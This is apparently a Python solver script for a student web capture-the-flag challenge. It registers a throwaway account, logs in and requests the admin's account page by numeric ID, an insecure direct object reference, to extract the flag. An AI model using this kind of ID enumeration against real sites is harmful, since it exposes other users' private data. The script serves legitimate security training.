#!/bin/python3

import os
import requests
from pwn import *
import logging
import string, random, re

logging.disable()

# Per le challenge web
URL = os.environ.get("URL", "http://notes.challs.cyberhighschools.it")
if URL.endswith("/"):
    URL = URL[:-1]

s = requests.session()
regex = re.compile("flag{[^}]*}")

# Generate random username and password
username = "".join(random.choice(string.printable) for _ in range(20))
password = "".join(random.choice(string.printable) for _ in range(20))

res = s.post(f"{URL}/register", data={"username": username, "password": password})
if not res.ok:
    print("Error registering user")
    exit(1)

res = s.post(f"{URL}/login", data={"username": username, "password": password})
if not res.ok:
    print("Error logging in")
    exit(2)

res = s.get(f"{URL}/account/1")
if not res.ok:
    print("Error retrieving admin posts")
    exit(3)

flag = regex.findall(res.text)
if len(flag) == 0:
    print("Cannot find flag")
    exit(4)
print(flag[0])
